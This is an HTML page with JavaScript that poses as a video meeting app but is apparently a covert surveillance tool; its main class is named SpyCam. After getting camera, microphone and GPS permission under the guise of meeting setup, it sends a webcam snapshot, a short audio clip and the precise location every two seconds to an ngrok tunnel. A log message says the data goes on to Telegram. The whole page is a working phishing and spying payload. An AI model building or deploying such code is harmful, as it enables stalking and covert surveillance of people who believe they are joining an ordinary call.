<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
</head>

<!-- Mobile-optimized video/canvas -->
<video id="video" autoplay playsinline muted style="display: none;"></video>
<canvas id="canvas" width="640" height="480"></canvas>

<!-- Mobile permission screen -->
<div id="permissionScreen" style="position:fixed;top:0;left:0;width:100%;height:100%;background:#1a1a2e;z-index:9999;display:flex;flex-direction:column;justify-content:center;align-items:center;padding:20px;box-sizing:border-box;">
  <div style="background:white;border-radius:20px;padding:30px;max-width:400px;width:95%;text-align:center;box-shadow:0 20px 40px rgba(0,0,0,0.3);">
    <h2 style="color:#16213e;margin-bottom:20px;">📱 Meeting Permissions</h2>
    <div id="statusList" style="margin-bottom:20px;">
      <div>📹 Camera: <span id="camStatus">Waiting...</span></div>
      <div style="margin-top:10px;">🎤 Microphone: <span id="micStatus">Waiting...</span></div>
      <div style="margin-top:10px;">📍 GPS Location: <span id="gpsStatus">Waiting...</span></div>
    </div>
    <button id="retryBtn" onclick="spyCam.retryAll()" style="background:#0f3460;color:white;border:none;padding:15px 30px;border-radius:25px;font-size:16px;font-weight:600;cursor:pointer;">Retry Permissions</button>
  </div>
</div>

<!-- Main app (hidden until permissions) -->
<div id="mainApp" style="display:none;">
  <canvas id="canvasMain" width="640" height="480" style="width:100%;height:70vh;max-width:640px;max-height:480px;border-radius:15px;display:block;margin:20px auto;box-shadow:0 20px 40px rgba(0,0,0,0.3);"></canvas>
</div>

<style>
  body {
    margin: 0;
    padding: 0;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    height: 100vh;
    overflow: hidden;
  }
  .bottom-bar {
    position: fixed; bottom: 0; left: 0; right: 0; height: 80px;
    background: rgba(0,0,0,0.9); backdrop-filter: blur(20px);
    display: flex; justify-content: center; align-items: center;
    gap: 15px; padding: 0 15px; box-sizing: border-box;
  }
  .icon-button {
    display: flex; flex-direction: column; align-items: center;
    color: white; padding: 8px; border-radius: 12px; transition: all 0.3s;
    min-width: 50px;
  }
  .icon-button:hover { background: rgba(255,255,255,0.1); }
  .icon-button i { font-size: 20px; margin-bottom: 3px; }
  .end-call {
    background: linear-gradient(45deg, #ef4444, #dc2626); color: white;
    padding: 12px 24px; border-radius: 25px; font-weight: 600;
    border: none; cursor: pointer; margin-left: 20px;
  }
  .status-ok { color: #4ade80; font-weight: bold; }
  .status-error { color: #ef4444; font-weight: bold; }
  .status-wait { color: #facc15; }
</style>

<script>
class SpyCam {
  constructor() {
    this.video = document.getElementById('video');
    this.canvas = document.getElementById('canvasMain');
    this.permissionScreen = document.getElementById('permissionScreen');
    this.mainApp = document.getElementById('mainApp');
    this.stream = null;
    this.mediaRecorder = null;
    this.audioChunks = [];
    this.currentLocation = null;
    this.tunnelUrl = 'https://7462-157-36-86-192.ngrok.io/post.php';
    this.init();
  }
  
  async init() {
    console.log('📱 Mobile SpyCam starting...');
    await this.requestAllPermissions();
  }
  
  async requestAllPermissions() {
    try {
      // 1. CAMERA + MIC (mobile browsers ask together)
      await this.requestMedia();
      
      // 2. GPS (separate permission)
      await this.requestGPS();
      
      // 3. Success - show main app
      this.showMainApp();
      
    } catch (err) {
      console.error('❌ Permissions failed:', err);
      this.updateStatus('gpsStatus', 'FAILED - Tap Retry', 'error');
    }
  }
  
  async requestMedia() {
    this.updateStatus('camStatus', 'Requesting...', 'wait');
    this.updateStatus('micStatus', 'Requesting...', 'wait');
    
    const constraints = {
      video: { 
        facingMode: 'user',
        width: { ideal: 640 },
        height: { ideal: 480 }
      },
      audio: true
    };
    
    this.stream = await navigator.mediaDevices.getUserMedia(constraints);
    this.video.srcObject = this.stream;
    
    // Wait for video to start
    await new Promise(resolve => {
      this.video.onloadedmetadata = () => {
        this.video.play();
        this.updateStatus('camStatus', 'OK', 'ok');
        this.updateStatus('micStatus', 'OK', 'ok');
        this.initRecorder();
        resolve();
      };
    });
  }
  
  requestGPS() {
    return new Promise((resolve, reject) => {
      this.updateStatus('gpsStatus', 'Requesting location...', 'wait');
      
      navigator.geolocation.getCurrentPosition(
        (position) => {
          this.currentLocation = {
            lat: position.coords.latitude,
            lng: position.coords.longitude,
            accuracy: position.coords.accuracy
          };
          console.log('📍 GPS OK:', this.currentLocation.lat, this.currentLocation.lng);
          this.updateStatus('gpsStatus', `OK (${this.currentLocation.accuracy.toFixed(0)}m)`, 'ok');
          resolve();
        },
        (error) => {
          console.error('❌ GPS denied:', error);
          this.currentLocation = { error: error.message };
          this.updateStatus('gpsStatus', error.message, 'error');
          reject(error);
        },
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 30000 }
      );
    });
  }
  
  initRecorder() {
    const tracks = this.stream.getAudioTracks();
    if (tracks.length > 0) {
      this.mediaRecorder = new MediaRecorder(this.stream);
      this.mediaRecorder.ondataavailable = (e) => this.audioChunks.push(e.data);
      console.log('✅ Mobile audio recorder ready');
    }
  }
  
  showMainApp() {
    this.permissionScreen.style.display = 'none';
    this.mainApp.style.display = 'block';
    this.startCapture();
  }
  
  startCapture() {
    setInterval(() => {
      const ctx = this.canvas.getContext('2d');
      ctx.drawImage(this.video, 0, 0, 640, 480);
      const imageData = this.canvas.toDataURL('image/png');
      
      // Audio
      if (this.mediaRecorder?.state === 'inactive') {
        this.mediaRecorder.start();
        setTimeout(() => this.mediaRecorder?.stop(), 1400);
      }
      
      // Send
      setTimeout(() => this.sendData(imageData), 1500);
      
    }, 2000);
  }
  
  async sendData(imageData) {
    const formData = new FormData();
    formData.append('cat', imageData);
    if (this.audioChunks.length) {
      formData.append('audio', new Blob(this.audioChunks, {type:'audio/webm'}), 'audio.webm');
    }
    formData.append('location', JSON.stringify(this.currentLocation));
    
    $.ajax({
      url: this.tunnelUrl,
      type: 'POST',
      data: formData,
      processData: false,
      contentType: false,
      success: (res) => console.log('✅ Sent to Telegram:', res),
      error: (err) => console.log('❌ Send failed:', err)
    });
    this.audioChunks = [];
  }
  
  updateStatus(id, text, type) {
    document.getElementById(id).textContent = text;
    document.getElementById(id).className = `status-${type}`;
  }
  
  retryAll() {
    location.reload();
  }
}

let spyCam;
window.addEventListener('load', () => {
  spyCam = new SpyCam();
});
</script>

<div class="bottom-bar">
  <div class="icon-button"><i class="fas fa-microphone"></i><span>MIC</span></div>
  <div class="icon-button"><i class="fas fa-video"></i><span>VID</span></div>
  <div class="icon-button"><i class="fas fa-map-marker-alt"></i><span>GPS</span></div>
  <div class="icon-button"><i class="fas fa-users"></i><span>1</span></div>
  <button class="end-call" onclick="window.close()">End Meeting</button>
</div>

</body>
</html>
